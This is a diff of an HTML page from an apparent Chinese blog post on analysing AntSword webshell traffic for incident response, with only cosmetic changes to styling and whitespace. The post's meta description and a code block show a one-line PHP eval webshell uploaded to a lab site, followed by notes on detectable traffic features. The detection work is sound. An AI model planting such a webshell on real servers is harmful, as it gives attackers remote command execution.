@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='https://blog.winglet.com/p/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/'>
 
-<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="蚁剑流量分析">
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="蚁剑流量分析">
 <meta property='og:description' content="前言 做应急响应题遇到了蚁剑流量分析的题，就正好研究一下\n蚁剑流量特征 基本特征 在kali虚拟机中用小皮面板开一个站点，然后上传一个木马文件\n内容如下\n#1.php &lt;?php eval($_POST[&#39;cmd&#39;]); ?&gt; 然后打开wireshark，接着用蚁剑进行连接，这时就可以抓到蚁剑流量的包了\n">
 <meta property='og:url' content='https://blog.winglet.com/p/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/'>
 <meta property='og:site_name' content='Winglet&#39;s Blog'>
@@ -347,7 +347,7 @@
 ></p>
 <p>内容如下</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#1.php
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></div><p>然后打开<code>wireshark</code>，接着用蚁剑进行连接，这时就可以抓到蚁剑流量的包了</p>
@@ -374,8 +374,8 @@
 ></p>
 <p>这个就是蚁剑的流量包内容。现在可以总结蚁剑流量的基本特征</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="p">.</span><span class="w"> </span><span class="err">请求包中有</span><span class="o">`</span><span class="n">ini_set</span><span class="o">`</span><span class="err">函数</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">2</span><span class="p">.</span><span class="w"> </span><span class="err">连接命令在第一个</span><span class="o">=</span><span class="err">前</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3</span><span class="p">.</span><span class="w"> </span><span class="err">使用的是</span><span class="n">php语言</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="p">.</span><span class="w"> </span><span class="err">连接命令在第一个</span><span class="o">=</span><span class="err">前</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="mi">3</span><span class="p">.</span><span class="w"> </span><span class="err">使用的是</span><span class="n">php语言</span><span class="w">
 </span></span></span></code></pre></div><h3 id="执行命令">执行命令
 </h3><p>现在在蚁剑中打开虚拟终端，输入<code>whoami</code>命令<img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405080002395.png"
 	
